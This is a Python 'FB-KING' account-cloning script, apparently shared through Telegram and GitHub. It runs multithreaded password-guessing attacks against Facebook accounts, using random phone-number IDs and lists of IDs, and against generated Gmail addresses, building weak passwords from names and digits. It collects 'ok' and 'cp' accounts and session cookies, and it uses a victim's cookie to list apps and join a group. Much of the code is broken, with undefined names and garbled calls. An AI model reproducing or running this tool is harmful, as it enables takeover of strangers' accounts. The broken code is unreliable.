#this script given by mueor
#join telegram 
#t.me/mueorb

import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="get")
    game = [i.text for i in find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://m.facebook.com/groups/940528313994501/?ref=share&mibextid=NSMWBT', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://x.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
          
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
#os.system('xdg-open https://github.com/X10-safwan')
logo = ("""\033[38;5;46m
       
""")
def linex():
	print('\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
loop = 0
oks = []
cps = []
def clear():
    os.system('clear')
    #os.system('xdg-open https://www.facebook.com/X10.Safwan.king?mibextid=kFxxJD')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[38;5;46m')
    v = 5.3
    update = ('5.3')
    update = ('5.3')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[38;5;46m')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

ugen2=[]
ugen=[]
 
def clear():
 os.system('clear')
def banner():
    #os.system('clear')
    print(f"""   \033[32;1m    __________        __ __ _____   ________
   \033[33;1m   / ____/ __ )      / //_//  _/ | / / ____/
   \033[31;1m  / /_  / __  |_____/ ,<   / //  |/ / / __  
   \033[34;1m / __/ / /_/ /_____/ /| |_/ // /|  / /_/ /  
   \033[32;1m/_/   /_____/     /_/ |_/___/_/ |_/\____/                                              
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} FB-KING                 {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}Mahin Ahmed             {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+8801841004250          {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/FB-KING{N}    {H}  ║
  {H}  ║{P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}     ║
   {H} ║{P}[{H}•{P}] Network   : {H}3G{N}, {H}4G/5G{N}, {H}ON{N}     {H}      ║
   {H} ║{P}[{H}•{P}] Version   : {H}2.0.9                   ║
   {H} ║{P}[{H}•{P}] Tools     : {H}ULTRA GREEN             ║
   {M} ╚════════════════════════════════════════╝ {P}""")
    print(f"""{GREEN}    SELL DONE{
 {K}[{H}√{K}]{P} Successfully Update Done {H}2.0.9""");print(led)


c0=('ht')
c4=('tps://')
c1=('tinyurl')
c2=('.com/')
c3=('2n8sj2p4')
cu=('Ki')
cuu=('ngcy')
cuuu=('ber')

c0=('ht')
c4=('tps://')
c1=('tinyurl')
c2=('.com/')
c3=('2n8sj2p4')
cu=('Ki')
cuu=('ngcy')
cuuu=('ber')
#
#
gffff=('FB-')
kffff=('KING')
c0=('ht')
c4=('tps://')
c1=('tinyurl')
c2=('.com/')
c3=('2n8sj2p4')
cu=('Ki')
cuu=('ngcy')
cuuu=('ber')

def mainx():
    clear();banner()
    print(f"{K} [{H}1{K}] {WHITE}Create File ")
    print(f"{K} [{H}2{K}] {WHITE}Public Cloning ")
    print(f"{K} [{H}3{K}] {WHITE}File   Cloning ")
    print(f"{K} [{H}4{K}] {WHITE}Random Cloning {H}more..7+")
    print(f'{K} [{H}5{K}] {WHITE}Separate Ids ')
    print(f'{K} [{H}6{K}] {WHITE}Remove Duplicate Ids')
    print(f'{K} [{H}7{K}] {N}Follow Github ')
    print(f'{K} [{H}8{K}] {N}Contract FB-KING')
    print(f"{K} [{M}0{K}] {WHITE}Exit Tools ");print(led)
    mahin = input(f'{wt}Select menu {M}:{H} ')
    if mahin in ["1","01"]:
        exit()
    elif mahin in ["10","02"]:
        exit()
    elif mahin in ["3","03"]:
        cr()
    elif mahin in ["4","04"]:
        mainx2()
    elif mahin in ["5","05"]:
        sep()
    elif mahin in ["6","06"]:
     dupcutter()
    elif mahin in ["7","07"]:
     os.system("xdg-open https://github.com/FB-KING");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/FB.KING.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-KING {P}Terminal ');os.system("xdg-open https://www.facebook.com/FB.KING.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.king.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.KING.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
    print(f"{K} [{H}1{K}] {WHITE}Random Cloning {H}6 Digit")
    print(f"{K} [{H}2{K}] {WHITE}Random Cloning {H}7 Digit ")
    print(f"{K} [{H}3{K}] {WHITE}Random Cloning {H}8 Digit ")
    print(f"{K} [{H}4{K}] {WHITE}Random Cloning {H}Pak/Ind")
    print(f"{K} [{H}5{K}] {WHITE}Gmail  Cloning {H}V1")
    print(f"{K} [{H}6{K}] {WHITE}Gmail  Cloning {H}V2")
    print(f"{K} [{M}0{K}] {WHITE}Back To Menu");print(led)
    mahin = input(f'{wt}Select menu {M}:{H} ')
    if mahin in ["1","01"]:
        x6()
    elif mahin in ["2","02"]:
        x7()
    elif mahin in ["3","03"]:
        x8()
    elif mahin in ["4","04"]:
        xp()
    elif mahin in ["5","05"]:
     gf1()
    elif mahin in ["6","06"]:
     gf2()
    elif mahin in ["0","00"]:
     mainx()
    else:
        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.KING.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
# SEPARATE IDS -- MAIN DEF #
def sep():
    os.system('clear')
    banner()
    try:
        limit = int(input(f'{wt}Separate Ids Limit {M}?{K} [{H}1{P}/{B}100{K}] {M}:{H} '))
    except:
        limit = 1
    print(led);print(f'{gen}Example {M}:{H} /sdcard/filename.txt');print(led)
    file_name = input(f'{wt}{N}Put File {M}:{H} ')
    print(led);print(f'{dot}Total File Ids {M}:{H} ' +
          str(len(open(file_name).read().splitlines())));print(led);print(f'{gen}Example {M}:{H} /sdcard/Mahin.txt');print(led)
    new_save = input(f'{wt}{N}File Save {M}:{H} ')
    y = 0
    for k in range(limit):
        y += 1
        print(led);print(f'{dot}√ {P}[{H}100077{P}] [{H}100070{P}] [{H}100010{P}] [{H}100060{P}]\033[1;0m ');print(led);print(f'{dot}√[{H}100085{P}] [{H}100086{P}] [{H}100089{P}] [{H}10009{P}]\033[1;0m ');print(led)
        links = input(f'{wt}Put Link {M}:\033[1;32m ')
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(led);print(f'{dot}{N}Links Grabbed Successfully');print(led);print(f'{dot}Total Grabbed Links {M}:\033[1;32m '+
          str(len(open(new_save).read().splitlines())));print(led);print(f'{gen}New File Save As {M}:{H} '+new_save);print(led)
    input(f'{wt} {P}Main Menu {M}?{K} [{H}Press enter to back{K}] {M}:{H} ')
    mainx()
# 2LINK REMOVER -- MAIN DEF #
def dupcutter():
    os.system('clear');banner();print(f'{dot}Example   {RED}:{H} /sdcard/mahin.txt');print(led)
    Error = input(f"{wt}{N}File Name {RED}:{H} ");print(led);print(f'{dot}Example   {RED}:{H} /sdcard/Mahin.txt');print(led)
    Error1 = input(f"{wt}{N}New File  {RED}:{H} ")
    os.system('touch ' + Error)
    os.system('sort -r '+Error+' | uniq > '+Error1)
    print(led);print(f"{dot}Removing Successful{RED}:{H} "+ Error);print(led);print(f"{dot}File Total Ids {RED}:{H} "+str(len(open(Error1).read().splitlines())));print(led);print(f"{dot}New File Save As {H} " + Error1);print(led)
    input(f'{dot}Main Menu {RED}?{K} [{H}Press enter to back{K}] {RED}:{H} ')
    mainx()
# FILE CRACK -- MAIN DEF #
def cr():
            os.system('clear');banner();print(f'{dot}Follow This Link Ids {P}[{H}10009,100089{P}] ');time.sleep(0.05);print(led)
            try:
                fileX = input(f"{wt}Input File {RED}:{H} ")
                for line in open(fileX, 'r').readlines():
                    id.append(line.strip())
                setting()
            except IOError:
               print(f"\n{wt}{RED}File %s not found"%(fileX))
               mainx()
def setting():
    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}New Ids Crack [{H}Fast{P}]');print(f' {K}[{H}2{K}] {P}Mix Ids Crack [{H}Test{P}]');print(f' {K}[{H}3{K}] {P}Old Ids Crack [{H}Slow{P}]');print(led)
    hu = input(f'{dot}Select menu {M}:{H} ')
    if hu in ['3','old']:
        for tua in sorted(id):
            id2.append(tua)       
    elif hu in ['1','new']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['2','random']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:print('Wrong try again');exit();print('')
    print(led)
    xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
    else:cp_xdx.append('n')
    print(led)
    cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
    else:cokix.append('n')
    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]');print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
    hc = input(f'{wt}Select Method {M}:{H} ')
    if hc in ['1','01']:method.append('m1')
    elif hc in ['2','02']:method.append('m2')
    elif hc in ['3','03']:method.append('m3')
    elif hc in ['4','04']:method.append('m4')
    elif hc in ['5','05']:method.append('a1')
    elif hc in ['6','06']:method.append('f1')
    else:method.append('m1')
    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}Password [{H}first+last{P}]');print(f' {K}[{H}2{K}] {P}Password [{H}first+last+3{P}]');print(f' {K}[{H}3{K}] {P}Password [{H}first+last+5+{P}]');print(f' {K}[{H}4{K}] {P}Password [{H}first+last+7+{P}]');print(led)
    px=input(f'{wt}Select Password {M}:{H} ')
    if px in ['1','01']:p1()
    elif px in ['2','02']:p2()
    elif px in ['3','03']:p3()
    else:p4()
def p1():
    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led)
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12')
            else:
                if len(frs)<3:pwv.append(nmf)
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12')
            if 'ya' in pwpluss:
                for xpwd in pwnya:pwv.append(xpwd)
            else:pass
            if 'm1' in method:pool.submit(m5,idf,pwv)
            elif 'm2' in method:pool.submit(m2,idf,pwv)
            elif 'm3' in method:pool.submit(m3,idf,pwv)
            elif 'm4' in method:pool.submit(m4,idf,pwv)
            elif 'a1' in method:pool.submit(f1,idf,pwv)
            elif 'f1' in method:pool.submit(f1,idf,pwv)
            else:pool.submit(m5,idf,pwv)
    print('');print(f'{gen}Hi Dear User Crack process has been completed');exit()
def p2():
    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led)
    with tred(max_workers=30) as pool:
        for yuzong in id02:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@');pwv.append(frs+'@@')
            else:
                if len(frs)<3:pwv.append(nmf)
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@');pwv.append(frs+'@@')
            if 'ya' in pwpluss:
                for xpwd in pwnya:pwv.append(xpwd)
            else:pass
            if 'm1' in method:pool.submit(m1,idf,pwv)
            elif 'm2' in method:pool.submit(m2,idf,pwv)
            elif 'm3' in method:pool.submit(m3,idf,pwv)
            elif 'm4' in method:pool.submit(m4,idf,pwv)
            elif 'a1' in method:pool.submit(f1,idf,pwv)
            elif 'f1' in method:pool.submit(f1,idf,pwv)
            else:pool.submit(m5,idf,pwv)
    print('');print(f'{gen}Hi Dear User Crack process has been completed');exit()
def p3():
    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led)
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@');pwv.append(frs+'@@');pwv.append(frs+'123456');pwv.append(frs+'12345')
            else:
                if len(frs)<3:pwv.append(nmf)
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@');pwv.append(frs+'@@');pwv.append(frs+'123456');pwv.append(frs+'12345')
            if 'ya' in pwpluss:
                for xpwd in pwnya:pwv.append(xpwd)
            else:pass
            if 'm1' in method:pool.submit(m1,idf,pwv)
            elif 'm2' in method:pool.submit(m2,idf,pwv)
            elif 'm3' in method:pool.submit(m3,idf,pwv)
            elif 'm4' in method:pool.submit(m4,idf,pwv)
            elif 'a1' in method:pool.submit(f1,idf,pwv)
            elif 'f1' in method:pool.submit(f1,idf,pwv)
            else:pool.submit(m5,idf,pwv)
    print('');print(f'{gen}Hi Dear User Crack process has been completed');exit()
def p4():
    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led)
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@');pwv.append(frs+'@@');pwv.append(frs+'123456');pwv.append(frs+'12345');pwv.append(frs+'1122');pwv.append(frs+'@123')
            else:
                if len(frs)<3:pwv.append(nmf)
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@');pwv.append(frs+'@@');pwv.append(frs+'123456');pwv.append(frs+'12345');pwv.append(frs+'1122');pwv.append(frs+'@123')
            if 'ya' in pwpluss:
                for xpwd in pwnya:pwv.append(xpwd)
            else:pass
            if 'm1' in method:pool.submit(m1,idf,pwv)
            elif 'm2' in method:pool.submit(m2,idf,pwv)
            elif 'm3' in method:pool.submit(m3,idf,pwv)
            elif 'm4' in method:pool.submit(m4,idf,pwv)
            elif 'a1' in method:pool.submit(f1,idf,pwv)
            elif 'f1' in method:pool.submit(f1,idf,pwv)
            else:pool.submit(m5,idf,pwv)
    print('');print(f'{gen}Hi Dear User Crack process has been completed');exit()
# GMAIL CRACK -- MAIN DEF #
def gf1(): 
    idf=[]
    os.system('clear');banner();print(fst);print(led)
    first = input(f'{dot}First Name {M}: {H}');print(led);print(lst);print(led)
    last = input(f'{dot}Last Name {M}: {H}');print(led);print(limitt);print(led)
    limit = int(input(f'{dot}Crack Limit {M}: {H}'))
    domain = '@gmail.com'
    print(led)
    xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
    else:cp_xdx.append('n')
    print(led)
    cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
    else:cokix.append('n')
    tkk = first+last
    banner();print(f"{dot}{P}Gmail Ids {RED}: {tkk[:4]}****{domain}");print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
    print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
    mthd = input(f'{wt}Select Method {M}:{H} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        idf.append(nmp)
    with tred(max_workers=40) as king_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        os.system("clear");banner();print(f'{dot}Method    {RED}:{H} M-{mthd}-P-Auto');print(f'{dot}Gmail ids {RED}:{H} {tk[:4]}****{domain}');print(f'{dot}Total Ids {RED}: {H}'+idx);print(led)
        for number in idf:
            idf = first+'.'+last+'.'+number+domain
            pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12'] 
            if mthd in ['1','01']:king_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:king_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:king_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:king_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:king_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']:king_xd.submit(f1,idf,pwv)
            else:
               king_xd.submit(m5,idf,pwv)
    print('');print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+(ok)) #;print(f' {P}Total cp : {K}'+str(len(cp)));print('')
    input('Press Enter To Go Menu');os.system('python CRAZY-GREEN.py')
def gf2(): 
    idf=[]
    os.system('clear');banner();print(fst);print(led)
    first = input(f'{dot}First Name {M}: {H}');print(led);print(lst);print(led)
    last = input(f'{dot}Last Name {M}: {H}');print(led);print(limitt);print(led)
    limit = int(input(f'{dot}Crack Limit {M}: {H}'))
    domain = '@gmail.com'
    print(led)
    xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
    else:cp_xdx.append('n')
    print(led)
    cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
    else:cokix.append('n')
    tkk = first+last
    banner();print(f"{dot}{P}Gmail Ids {RED}: {tkk[:4]}****{domain}");print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
    print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
    mthd = input(f'{wt}Select Method {M}:{H} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(3))
        idf.append(nmp)
    with tred(max_workers=40) as king_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        os.system("clear");banner();print(f'{dot}Method    {RED}:{H} M-{mthd}-P-Auto');print(f'{dot}Gmail ids {RED}:{H} {tk[:4]}****{domain}');print(f'{dot}Total Ids {RED}: {H}'+idx);print(led)
        for number in idf:
            idf = first+'.'+last+number+domain
            pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12',first+last+'123'] 
            if mthd in ['1','01']:king_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:king_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:king_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:king_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:king_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']:king_xd.submit(f1,idf,pwv)
            else:
               king_xd.submit(m5,idf,pwv)
    print('');print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+(ok)) #;print(f' {P}Total cp : {K}'+str(len(cp)));print('')
    input('Press Enter To Go Menu');os.system('python CRAZY-GREEN.py')

def x8():
  user=[]
  os.system('clear');banner();print(c8);print(led)
  kode = input(f'{dot}Select Code {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}Crack Limit {M}: {H}'));print(led)
  xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
  print(led)
  cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  else:cokix.append('n')
  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  for nmbr in range(limit):
    koda = ''.join(random.choice(string.digits) for _ in range(2))
    kodb = ''.join(random.choice(string.digits) for _ in range(2))
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
    for guru in user:
      idf = kode+koda+kodb+guru
      pwv = [koda+kodb+guru,koda+kodb+guru[1:],idf,kode+koda+kodb,kode+koda+kodb[1:]] #,'@#@#@#','bangladesh','free fire','i love you']
      if hc in ['1','01']:king_xd.submit(m1,idf,pwv)
      elif hc in ['2','02']:king_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:king_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:king_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:king_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:king_xd.submit(f1,idf,pwv)
      else:
       king_xd.submit(main,idf,pwv)
# BANGLADESH 7 DIGIT -- MAIN DEF #
def x7():
  user=[]
  os.system('clear');banner();print(c7);print(led)
  kode = input(f'{dot}Select Code {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}Crack Limit {M}: {H}'));print(led)
  xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
  print(led)
  cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  else:cokix.append('n')
  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(7))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
    for guru in user:
      idf = kode+guru
      pwv=[idf,guru,guru[1:],idf[:7],idf[:6],idf[:8]]
      if hc in ['1','01']:king_xd.submit(m3,idf,pwv)
      elif hc in ['2','02']:king_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:king_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:king_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:king_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:king_xd.submit(f1,idf,pwv)
      else:
       king_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-KING.py')
# INDIA X PAKISTAN -- MAIN DEF #
def x6():
  user=[]
  os.system('clear');banner();print(c6);print(led)
  kode = input(f'{dot}Select Code {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}Crack Limit {M}: {H}'));print(led)
  xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
  print(led)
  cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  else:cokix.append('n')
